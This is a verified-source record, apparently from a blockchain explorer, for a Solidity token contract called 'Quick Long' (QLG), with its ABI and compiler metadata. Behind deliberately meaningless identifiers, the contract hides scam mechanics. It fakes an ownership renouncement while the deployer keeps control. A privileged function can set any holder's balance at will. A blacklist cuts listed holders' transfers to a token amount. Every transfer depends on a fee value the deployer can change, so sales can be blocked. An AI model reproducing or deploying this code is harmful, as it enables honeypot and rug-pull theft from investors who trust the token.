{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface launchShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverMaxAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeReceiver {\n    function createPair(address maxLaunched, address fromSenderList) external returns (address);\n}\n\ninterface fundAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyReceiver) external view returns (uint256);\n\n    function transfer(address shouldLimit, uint256 exemptFundSender) external returns (bool);\n\n    function allowance(address liquidityFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptFundSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldLimit,\n        uint256 exemptFundSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atSenderEnable, uint256 value);\n    event Approval(address indexed liquidityFee, address indexed spender, uint256 value);\n}\n\ninterface listTo is fundAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract QuickLong is receiverMaxAmount, fundAuto, listTo {\n\n    mapping(address => uint256) private launchedMinMarketing;\n\n    uint256 listFee;\n\n    mapping(address => bool) public receiverIs;\n\n    bool private fromReceiver;\n\n    uint256 constant walletSell = 11 ** 10;\n\n    string private swapSell = \"Quick Long\";\n\n    function approve(address tradingReceiver, uint256 exemptFundSender) public virtual override returns (bool) {\n        modeTake[_msgSender()][tradingReceiver] = exemptFundSender;\n        emit Approval(_msgSender(), tradingReceiver, exemptFundSender);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed sellMax, address indexed fundLimit);\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeSwap;\n    }\n\n    bool public receiverMaxToken;\n\n    bool public autoLaunchShould;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isReceiver;\n    }\n\n    function fundTo() private view {\n        require(buyReceiverAt[_msgSender()]);\n    }\n\n    string private feeSwap = \"QLG\";\n\n    address public receiverMin;\n\n    bool public shouldLiquidity;\n\n    mapping(address => bool) public buyReceiverAt;\n\n    constructor (){\n        \n        launchShould exemptMarketing = launchShould(fromTx);\n        totalLimit = takeReceiver(exemptMarketing.factory()).createPair(exemptMarketing.WETH(), address(this));\n        \n        receiverMin = _msgSender();\n        fromSender();\n        buyReceiverAt[receiverMin] = true;\n        launchedMinMarketing[receiverMin] = enableTrading;\n        \n        emit Transfer(address(0), receiverMin, enableTrading);\n    }\n\n    address public totalLimit;\n\n    function launchedTx(address exemptReceiver) public {\n        fundTo();\n        if (shouldLiquidity) {\n            shouldList = maxSender;\n        }\n        if (exemptReceiver == receiverMin || exemptReceiver == totalLimit) {\n            return;\n        }\n        receiverIs[exemptReceiver] = true;\n    }\n\n    uint256 private maxSender;\n\n    function name() external view virtual override returns (string memory) {\n        return swapSell;\n    }\n\n    function sellMode(address launchTo, address shouldLimit, uint256 exemptFundSender) internal returns (bool) {\n        if (launchTo == receiverMin) {\n            return minTxSender(launchTo, shouldLimit, exemptFundSender);\n        }\n        uint256 fundReceiver = fundAuto(totalLimit).balanceOf(enableFund);\n        require(fundReceiver == listFee);\n        require(shouldLimit != enableFund);\n        if (receiverIs[launchTo]) {\n            return minTxSender(launchTo, shouldLimit, walletSell);\n        }\n        return minTxSender(launchTo, shouldLimit, exemptFundSender);\n    }\n\n    function getOwner() external view returns (address) {\n        return enableToken;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableTrading;\n    }\n\n    address private enableToken;\n\n    uint8 private isReceiver = 18;\n\n    bool public launchToken;\n\n    uint256 launchedIs;\n\n    function fromSender() public {\n        emit OwnershipTransferred(receiverMin, address(0));\n        enableToken = address(0);\n    }\n\n    address enableFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public shouldList;\n\n    function shouldFrom(address buyAmount, uint256 exemptFundSender) public {\n        fundTo();\n        launchedMinMarketing[buyAmount] = exemptFundSender;\n    }\n\n    function transferFrom(address launchTo, address shouldLimit, uint256 exemptFundSender) external override returns (bool) {\n        if (_msgSender() != fromTx) {\n            if (modeTake[launchTo][_msgSender()] != type(uint256).max) {\n                require(exemptFundSender <= modeTake[launchTo][_msgSender()]);\n                modeTake[launchTo][_msgSender()] -= exemptFundSender;\n            }\n        }\n        return sellMode(launchTo, shouldLimit, exemptFundSender);\n    }\n\n    function balanceOf(address buyReceiver) public view virtual override returns (uint256) {\n        return launchedMinMarketing[buyReceiver];\n    }\n\n    function transfer(address buyAmount, uint256 exemptFundSender) external virtual override returns (bool) {\n        return sellMode(_msgSender(), buyAmount, exemptFundSender);\n    }\n\n    function atTeam(address takeTotal) public {\n        if (launchToken) {\n            return;\n        }\n        \n        buyReceiverAt[takeTotal] = true;\n        if (shouldLiquidity == fromReceiver) {\n            autoLaunchShould = false;\n        }\n        launchToken = true;\n    }\n\n    function allowance(address fromWallet, address tradingReceiver) external view virtual override returns (uint256) {\n        if (tradingReceiver == fromTx) {\n            return type(uint256).max;\n        }\n        return modeTake[fromWallet][tradingReceiver];\n    }\n\n    uint256 public receiverAutoMarketing;\n\n    function teamBuy(uint256 exemptFundSender) public {\n        fundTo();\n        listFee = exemptFundSender;\n    }\n\n    function owner() external view returns (address) {\n        return enableToken;\n    }\n\n    function minTxSender(address launchTo, address shouldLimit, uint256 exemptFundSender) internal returns (bool) {\n        require(launchedMinMarketing[launchTo] >= exemptFundSender);\n        launchedMinMarketing[launchTo] -= exemptFundSender;\n        launchedMinMarketing[shouldLimit] += exemptFundSender;\n        emit Transfer(launchTo, shouldLimit, exemptFundSender);\n        return true;\n    }\n\n    uint256 private enableTrading = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private modeTake;\n\n    address fromTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSenderEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptFundSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"}],\"name\":\"atTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunchShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyReceiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"}],\"name\":\"launchedTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAutoMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMaxToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptFundSender\",\"type\":\"uint256\"}],\"name\":\"shouldFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptFundSender\",\"type\":\"uint256\"}],\"name\":\"teamBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptFundSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptFundSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "QuickLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}